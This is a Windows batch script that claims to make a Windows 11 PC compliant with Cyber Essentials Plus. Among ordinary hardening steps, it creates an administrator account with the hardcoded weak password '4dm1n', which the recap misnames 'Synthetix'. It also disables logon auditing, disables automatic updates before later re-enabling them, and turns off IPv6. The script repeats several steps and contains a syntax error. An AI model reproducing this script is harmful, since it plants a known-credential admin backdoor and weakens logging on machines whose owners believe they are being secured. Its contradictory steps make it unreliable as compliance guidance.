@echo off
title Cyber Essentials Plus Compliance Script
color 0a

REM Display Intro Screen
echo ============================================
echo          Cyber Essentials Plus Compliance Script
echo                      by HairyDuck
echo   GitHub Repository: https://github.com/HairyDuck/
echo ============================================
echo.
echo This script will configure your Windows 11 computer
echo to be compliant with Cyber Essentials Plus standards.
echo.
echo Please review and confirm each step before proceeding.
echo.
pause

REM Step 1: Disable automatic updates
echo.
echo Step 1: Disabling automatic updates...
echo This will disable automatic updates on your system.
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 2 /f

REM Step 2: Enable Windows Firewall
echo.
echo Step 2: Enabling Windows Firewall...
echo This will enable the Windows Firewall on your system.
echo.
pause
netsh advfirewall set allprofiles state on

REM Step 3: Disable Remote Desktop Protocol (RDP)
echo.
echo Step 3: Disabling Remote Desktop Protocol (RDP)...
echo This will disable the Remote Desktop Protocol on your system.
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f

REM Step 4: Enable User Account Control (UAC)
echo.
echo Step 4: Enabling User Account Control (UAC)...
echo This will enable User Account Control on your system.
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f

REM Step 5: Disable Autorun/Autoplay for removable devices
echo.
echo Step 5: Disabling Autorun/Autoplay for removable devices...
echo This will disable Autorun/Autoplay for removable devices on your system.
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f

REM Step 6: Enable BitLocker (optional - if supported by your hardware)
echo.
echo Step 6: Enabling BitLocker...
echo This will enable BitLocker drive encryption on your system.
echo (Note: BitLocker requires compatible hardware support.)
echo.
pause
manage-bde -on C: -used

REM Step 7: Configure password complexity
echo.
echo Step 7: Configuring password complexity...
echo This will configure password complexity settings on your system.
echo.
pause
net accounts /minpwlen:12 /minpwage:1 /maxpwage:60

REM Step 8: Disable unused services (example - modify as per your requirements)
echo.
echo Step 8: Disabling unused services...
echo This will disable specific services on your system.
echo (Note: Modify the services list as per your requirements.)
echo.
pause
sc config "Fax" start= disabled
sc config "RemoteRegistry" start= disabled
sc config "Telnet" start= disabled

REM Step 9: Configure auditing (example - modify as per your requirements)
echo.
echo Step 9: Configuring auditing...
echo This will configure auditing settings on your system.
echo (Note: Modify the auditing settings as per your requirements.)
echo.
pause
auditpol /set /subcategory:"Logon" /success:disable
auditpol /set /subcategory:"Logon" /failure:disable

REM Step 10: Disable SMBv1 protocol
echo.
echo Step 10: Disabling SMBv1 protocol...
echo This will disable the SMBv1 protocol on your system.
echo.
pause
sc.exe config lanmanworkstation depend= bowser/mrxsmb20/nsi
sc.exe config mrxsmb10 start= disabled

REM Step 11: Disable unnecessary network protocols (example - modify as per your requirements)
echo.
echo Step 11: Disabling unnecessary network protocols...
echo This will disable unnecessary network protocols on your system.
echo (Note: Modify the network protocols as per your requirements.)
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters" /v DisabledComponents /t REG_DWORD /d 255 /f

REM Step 12: Enable Windows Defender Antivirus
echo.
echo Step 12: Enabling Windows Defender Antivirus...
echo This will enable Windows Defender Antivirus on your system.
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f

REM Step 13: Enable Windows Defender SmartScreen
echo.
echo Step 13: Enabling Windows Defender SmartScreen...
echo This will enable Windows Defender SmartScreen on your system.
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 1 /f

REM Step 14: Enable Windows Firewall logging (optional - for monitoring purposes)
echo.
echo Step 14: Enabling Windows Firewall logging...
echo This will enable Windows Firewall logging on your system.
echo (Note: Logging is for monitoring purposes.)
echo.
pause
netsh advfirewall set allprofiles logging allowedconnections enable

REM Step 15: Disable unused and insecure protocols (example - modify as per your requirements)
echo.
echo Step 15: Disabling unused and insecure protocols...
echo This will disable unused and insecure protocols on your system.
echo (Note: Modify the protocols as per your requirements.)
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Client" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Server" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Client" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Server" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Client" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Server" /v Enabled /t REG_DWORD /d 0 /f

REM Step 16: Configure strong cipher suites (example - modify as per your requirements)
echo.
echo Step 16: Configuring strong cipher suites...
echo This will configure strong cipher suites on your system.
echo (Note: Modify the cipher suites as per your requirements.)
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers\RC4 128/128" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers\RC4 40/128" /v Enabled /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers\RC4 56/128" /v Enabled /t REG_DWORD /d 0 /f

REM Step 17: Disable unnecessary browser plugins (example - modify as per your requirements)
echo.
echo Step 17: Disabling unnecessary browser plugins...
echo This will disable unnecessary browser plugins on your system.
echo (Note: Modify the plugins as per your requirements.)
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{unwanted-BHO-CLSID}" /v Enabled /t REG_DWORD /d 0 /f

REM Step 18: Disable Autorun for removable devices
echo.
echo Step 18: Disabling Autorun for removable devices...
echo This will disable Autorun for removable devices on your system.
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 67108863 /f

REM Step 19: Enable full disk encryption (BitLocker) if supported by your hardware
echo.
echo Step 19: Enabling full disk encryption (BitLocker)...
echo This will enable full disk encryption (BitLocker) on your system.
echo (Note: BitLocker requires compatible hardware support.)
echo.
pause
manage-bde -on C: -used

REM Step 20: Configure Windows Event Logging
echo.
echo Step 20: Configuring Windows Event Logging...
echo This will configure Windows Event Logging on your system.
echo.
pause
wevtutil sl Security /ca:O:BAG:SYD:(D;;0xf0007;;;AN)(D;;0xf0007;;;BG)(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x3;;;SU)(A;;0x3;;;S-1-5-3)

REM Step 21: Configure account lockout policy
echo.
echo Step 21: Configuring account lockout policy...
echo This will configure the account lockout policy on your system.
echo.
pause
net accounts /lockoutthreshold:5 /lockoutduration:15

REM Step 22: Enable strong password policy
echo.
echo Step 22: Enabling strong password policy...
echo This will enable a strong password policy on your system.
echo.
pause
net accounts /minpwlen:12 /minpwage:1 /maxpwage:60 /uniquepw:1

REM Step 23: Enable Windows Defender Firewall domain profile
echo.
echo Step 23: Enabling Windows Defender Firewall domain profile...
echo This will enable the Windows Defender Firewall domain profile on your system.
echo.
pause
netsh advfirewall set domainprofile state on

REM Step 24: Disable NetBIOS over TCP/IP
echo.
echo Step 24: Disabling NetBIOS over TCP/IP...
echo This will disable NetBIOS over TCP/IP on your system.
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" /v NetBIOSOptions /t REG_DWORD /d 2 /f

REM Step 25: Enable Microsoft Enhanced Mitigation Experience Toolkit (EMET) features (if installed)
echo.
echo Step 25: Enabling EMET features (if installed)...
echo This will enable EMET features on your system (if EMET is installed).
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\EMET" /v EAF /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\EMET" /v EAF+" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\EMET" /v SEHOP /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\EMET" /v HeapSpray /t REG_DWORD /d 1 /f

REM Step 26: Configure Windows Update to automatically install updates
echo.
echo Step 26: Configuring Windows Update...
echo This will configure Windows Update to automatically install updates on your system.
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 4 /f

REM Step 27: Enable AppLocker (configure as per your organization's requirements)
echo.
echo Step 27: Enabling AppLocker...
echo This will enable AppLocker on your system.
echo (Note: Configure AppLocker policies as per your organization's requirements.)
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\SrpV2" /v DLL /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\SrpV2" /v Package /t REG_DWORD /d 1 /f

REM Step 28: Disable guest accounts
echo.
echo Step 28: Disabling guest accounts...
echo This will disable guest accounts on your system.
echo.
pause
net user guest /active:no

REM Step 29: Enable screensaver password protection
echo.
echo Step 29: Enabling screensaver password protection...
echo This will enable screensaver password protection on your system.
echo.
pause
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveUsePassword /t REG_SZ /d 1 /f

REM Step 30: Disable Autorun for removable devices
echo.
echo Step 30: Disabling Autorun for removable devices...
echo This will disable Autorun for removable devices on your system.
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 67108863 /f

REM Step 31: Enforce SMB signing
echo.
echo Step 31: Enforcing SMB signing...
echo This will enforce SMB signing on your system.
echo.
pause
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v EnableSecuritySignature /t REG_DWORD /d 1 /f

REM Step 32: Add administrator account
echo.
echo Step 32: Adding administrator account...
echo This will add an administrator account to your system.
echo.
pause
net user AdminAccount 4dm1n /add
net localgroup Administrators AdminAccount /add

REM Final Step: Recap of Changes
echo.
echo =============================
echo    Recap of Changes Made
echo =============================
echo 1. Disabled automatic updates.
echo 2. Enabled Windows Firewall.
echo 3. Disabled Remote Desktop Protocol (RDP).
echo 4. Enabled User Account Control (UAC).
echo 5. Disabled Autorun/Autoplay for removable devices.
echo 6. Enabled BitLocker (if supported by hardware).
echo 7. Configured password complexity.
echo 8. Disabled unused services.
echo 9. Configured auditing.
echo 10. Disabled SMBv1 protocol.
echo 11. Disabled unnecessary network protocols.
echo 12. Enabled Windows Defender Antivirus.
echo 13. Enabled Windows Defender SmartScreen.
echo 14. Enabled Windows Firewall logging.
echo 15. Disabled unused and insecure protocols.
echo 16. Configured strong cipher suites.
echo 17. Disabled unnecessary browser plugins.
echo 18. Disabled Autorun for removable devices.
echo 19. Enabled full disk encryption (BitLocker) if supported.
echo 20. Configured Windows Event Logging.
echo 21. Configured account lockout policy.
echo 22. Enabled strong password policy.
echo 23. Enabled Windows Defender Firewall domain profile.
echo 24. Disabled NetBIOS over TCP/IP.
echo 25. Enabled EMET features (if installed).
echo 26. Configured Windows Update.
echo 27. Enabled AppLocker.
echo 28. Disabled guest accounts.
echo 29. Enabled screensaver password protection.
echo 30. Disabled Autorun for removable devices.
echo 31. Enforced SMB signing.
echo 32. Added administrator account (Synthetix).

REM Final Completion Message
echo.
echo =============================
echo    Configuration completed!
echo =============================
echo.
pause
